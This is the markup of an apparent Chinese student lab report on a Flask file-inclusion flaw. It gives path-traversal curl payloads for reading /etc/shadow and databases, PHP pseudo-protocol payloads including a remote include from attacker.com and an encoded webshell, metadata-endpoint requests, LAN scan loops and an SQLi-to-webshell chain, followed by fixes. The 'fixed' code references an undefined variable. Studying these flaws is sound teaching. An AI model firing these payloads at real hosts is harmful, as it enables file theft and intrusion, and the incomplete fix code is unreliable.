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48"/>
        </w:rPr>
        <w:t>文件包含漏洞分析与修复报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="454545"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>——路径穿越·伪协议利用·文件读取——</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>实验项目：Web安全漏洞分析与修复</w:t>
        <w:br/>
        <w:t>课程名称：网络安全实训</w:t>
        <w:br/>
        <w:t>报告日期：2026年7月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rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第1章  文件包含漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第2章  路径穿越漏洞分析与复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第3章  伪协议漏洞详解（HTTP/data/php）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第4章  内网IP扫描与攻击链</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第5章  漏洞复现步骤（Burp Suite实操）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第6章  修复方案详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第7章  修复前后代码对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第8章  安全编码规范总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第一章  文件包含漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>文件包含漏洞（File Inclusion Vulnerability）是Web应用中常见的安全漏洞。攻击者通过操控文件路径参数，可以读取服务器上的任意文件，甚至执行远程代码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 漏洞危害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危害类型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信息泄露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读取/etc/passwd、config.py等敏感文件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路径遍历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使用../跳出限制目录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代码执行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配合日志文件或上传功能执行任意代码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内网探测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利用HTTP伪协议扫描内网资产</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 本次实验漏洞点</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="60"/>
        <w:shd w:fill="FFCDD2" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>🔴 漏洞：/page?name=help 中 name 参数直接拼接到文件路径，未做任何过滤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@app.route("/page", methods=["GET"])</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")  # ⚠️ 用户可控</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file_path = os.path.join("pages", name)  # ⚠️ 直接拼接，未过滤..</w:t>
        <w:br/>
        <w:t xml:space="preserve">    with open(file_path, "r") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        page_content = f.read()  # ⚠️ 任意文件读取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第二章  路径穿越漏洞分析与复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>路径穿越（Path Traversal）利用 ../ 符号跳出限制目录，读取系统任意文件。Flask中os.path.join不会阻止../，攻击者可构造特殊路径。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 攻击payload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payload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/page?name=help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正常访问帮助页面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/page?name=../app.py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读取Flask应用源码（信息泄露）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/page?name=../data/users.db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下载SQLite数据库文件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/page?name=../../etc/passwd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读取Linux密码文件（仅Linux）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/page?name=../../etc/shadow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读取用户密码哈希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/page?name=../static/uploads/shell.php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访问上传的WebShell</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>使用 curl 命令验证：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读取应用源码</w:t>
        <w:br/>
        <w:t>curl 'http://target:5000/page?name=../app.py'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 读取数据库文件</w:t>
        <w:br/>
        <w:t>curl 'http://target:5000/page?name=../data/users.db'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 下载数据库</w:t>
        <w:br/>
        <w:t>curl -o leaked_users.db 'http://target:5000/page?name=../data/users.db'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 多层穿越</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>根据服务器目录深度，可能需要多层 ../：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读取 /etc/passwd（Linux默认安装目录结构）</w:t>
        <w:br/>
        <w:t>curl 'http://target:5000/page?name=../../../../../../etc/passwd'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 读取 /etc/shadow</w:t>
        <w:br/>
        <w:t>curl 'http://target:5000/page?name=../../../../../../etc/shadow'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第三章  伪协议漏洞详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>伪协议（Pseudo Protocol）是在文件包含函数中使用的特殊协议，用于执行特定操作。虽然在Python/Flask中不如PHP常见，但理解其原理对安全分析至关重要。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 HTTP伪协议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>HTTP伪协议允许文件包含函数从远程服务器获取内容，用于远程文件包含(RFI)和内网扫描。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PHP代码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include('http://attacker.com/shell.txt')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远程执行恶意代码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include('http://192.168.1.1/admin.php')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探测内网Web服务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file_get_contents('http://169.254.169.254/latest/meta-data/')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读取AWS元数据（云服务器）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>内网探测利用：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扫描内网主机（通过HTTP响应时间/状态码判断存活）</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:t>for i in range(1,255):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    url = f'http://192.168.1.{i}:80'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    try:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        r = requests.get(url, timeout=1)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if r.status_code == 200:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            print(f'存活: {i}')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    except:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        pass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 data伪协议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>data伪协议允许直接在URL中嵌入数据内容，实现代码执行：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PHP代码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include('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==')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base64编码的PHP代码执行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file_get_contents('data://text/plain,hello')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读取纯文本数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 php伪协议（php://）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>php://协议允许访问各种I/O流，常用于读取源码和执行代码：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PHP代码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include('php://filter/read=convert.base64-encode/resource=config.php')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Base64读取源码（绕过过滤）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include('php://input')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POST方式发送PHP代码执行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php://filter/read=convert.base64-encode/resource=/etc/passwd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读取系统文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>php://filter 读取源码示例：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PHP中利用php://filter读取源码</w:t>
        <w:br/>
        <w:t>index.php?page=php://filter/read=convert.base64-encode/resource=config.php</w:t>
        <w:br/>
        <w:br/>
        <w:t># 返回config.php的Base64编码内容，解码后即可看到源码</w:t>
        <w:br/>
        <w:t># Base64解码：echo '编码内容' | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 读取内网IP地址</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>在云环境或内网环境中，可以利用伪协议读取内网元数据：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AWS云环境 - 读取内网IP和元数据</w:t>
        <w:br/>
        <w:t>curl http://169.254.169.254/latest/meta-data/local-ipv4</w:t>
        <w:br/>
        <w:t>curl http://169.254.169.254/latest/meta-data/public-ipv4</w:t>
        <w:br/>
        <w:t>curl http://169.254.169.254/latest/meta-data/</w:t>
        <w:br/>
        <w:br/>
        <w:t># 阿里云环境</w:t>
        <w:br/>
        <w:t>curl http://100.100.100.200/latest/meta-data/</w:t>
        <w:br/>
        <w:br/>
        <w:t># 本机内网IP</w:t>
        <w:br/>
        <w:t>ip addr show eth0 | grep 'inet '</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第四章  漏洞复现步骤（Burp Suite实操）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 准备工作</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 启动有漏洞的Flask应用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. 打开Burp Suite，配置浏览器代理127.0.0.1:8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. 打开Intercept拦截开关</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 路径穿越读取源码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>正常访问：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GET /page?name=help</w:t>
        <w:br/>
        <w:t>→ 显示帮助页面内容</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>路径穿越：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GET /page?name=../app.py</w:t>
        <w:br/>
        <w:t>→ 返回Flask应用源码（信息泄露！）</w:t>
        <w:br/>
        <w:br/>
        <w:t>GET /page?name=../../../../../../etc/passwd</w:t>
        <w:br/>
        <w:t>→ 返回系统账户信息（服务器配置）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 内网IP扫描（Burp Intruder）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>使用Burp Intruder进行内网端口扫描：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 拦截请求后发送到 Intruder（Ctrl+I）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 设置payload位置为 name 参数</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. 添加payload列表：常见内网IP段</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 根据响应时间/状态码判断端口是否开放</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>curl批量扫描：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for ip in 192.168.1.{1..254}; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">  curl -s --connect-timeout 1 "http://$ip:80/" &gt; /dev/null &amp;&amp; echo "存活: $ip"</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 完整攻击链</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>路径穿越 + SQL注入 + 文件上传联动攻击：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Step 1: SQL注入获取管理员密码</w:t>
        <w:br/>
        <w:t>POST /login</w:t>
        <w:br/>
        <w:t>username=admin' OR '1'='1' --&amp;password=</w:t>
        <w:br/>
        <w:br/>
        <w:t># Step 2: 路径穿越读取数据库文件</w:t>
        <w:br/>
        <w:t>GET /page?name=../data/users.db</w:t>
        <w:br/>
        <w:br/>
        <w:t># Step 3: 上传WebShell</w:t>
        <w:br/>
        <w:t>POST /upload (shell.php)</w:t>
        <w:br/>
        <w:br/>
        <w:t># Step 4: 执行系统命令</w:t>
        <w:br/>
        <w:t>POST /static/uploads/shell.php</w:t>
        <w:br/>
        <w:t>cmd=system('id');</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第五章  修复方案详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 过滤路径穿越字符</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="60"/>
        <w:shd w:fill="C8E6C9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✅ 修复：过滤 ../ 和 / 等路径穿越字符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@app.route("/page", methods=["GET"])</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 过滤路径穿越字符</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "../" in name or ".." in name:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "页面不存在"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "/" in name or "\\" in name:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "页面不存在"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 白名单机制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="60"/>
        <w:shd w:fill="C8E6C9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✅ 修复：只允许读取指定的页面文件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ALLOWED_PAGES = {"help", "about", "contact", "faq"}</w:t>
        <w:br/>
        <w:br/>
        <w:t>if name not in ALLOWED_PAGES:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "页面不存在"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 使用abspath规范化路径</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="60"/>
        <w:shd w:fill="C8E6C9" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✅ 修复：将路径解析为绝对路径后验证是否在允许目录内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import os.path</w:t>
        <w:br/>
        <w:br/>
        <w:t>base_dir = os.path.abspath("pages")</w:t>
        <w:br/>
        <w:t>requested_path = os.path.abspath(os.path.join("pages", name))</w:t>
        <w:br/>
        <w:br/>
        <w:t># ✅ 验证路径是否在pages目录内</w:t>
        <w:br/>
        <w:t>if not requested_path.startswith(base_dir):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "页面不存在"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 输入白名单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第六章  修复前后代码对比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有漏洞(app.py)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已修复(app_fixed.py)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路径过滤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无过滤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过滤..和/字符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白名单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无限制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白名单{help,about,faq}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路径验证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无验证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os.path.abspath校验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../穿越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允许穿越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拒绝穿越请求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任意文件读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❌ 可读任意文件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仅限pages目录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>修复代码（app_fixed.py）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# ✅ 安全的页面加载</w:t>
        <w:br/>
        <w:t>ALLOWED_PAGES = {"help", "about", "faq"}</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/page_fixed", methods=["GET"])</w:t>
        <w:br/>
        <w:t>def page_fixed():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 白名单检查</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if name not in ALLOWED_PAGES:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "页面不存在"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 路径校验</w:t>
        <w:br/>
        <w:t xml:space="preserve">    base = os.path.abspath("pages")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    req = os.path.abspath(os.path.join("pages", name))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not req.startswith(base):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "页面不存在"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("page_fixed.html", page_content=content, page_name=name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第七章  安全编码规范总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则一：永远不要信任用户输入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>用户提交的路径、文件名等必须经过严格校验，不能直接拼接到文件路径中。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则二：使用白名单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>文件包含的参数应使用白名单机制，明确允许哪些文件可被读取。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则三：路径规范化校验</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>使用os.path.abspath()将用户路径解析为绝对路径后，验证是否在允许的基目录内。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则四：最小权限原则</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Web进程不应以root权限运行，避免读取/etc/shadow等敏感文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则五：禁用危险功能</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>生产环境中应禁用文件包含、eval等危险功能，或实施严格的白名单控制。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则六：纵深防御</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>路径校验+白名单+文件权限控制+WAF规则，多层防护。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
          <w:sz w:val="24"/>
        </w:rP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